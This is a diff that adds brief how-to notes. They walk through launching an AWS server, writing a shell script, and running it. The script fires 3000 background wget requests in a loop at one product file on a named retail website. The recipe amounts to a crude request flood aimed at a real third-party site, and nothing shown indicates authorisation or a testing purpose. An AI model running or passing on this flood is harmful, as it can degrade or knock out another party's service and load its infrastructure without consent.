@@ -1,0 +1,11 @@
+create server instance on aws
+
+go to the pam file directory
+chmod 400 (_pam_file)
+ssh -i (pam_file)  ubuntu@(instance ip address/ipv4)
+log into the server
+mkdir test directory(scriptname)
+sudo vi/nano (scriptname).sh
+	insert command into the file (for i in {1..3000}; do  wget https://prod.girlfriend.com/feed/products/toasted-apricot-girlfriend-leggings.js -b ; done)
+chmod +x (scriptname)
+./(scriptname)
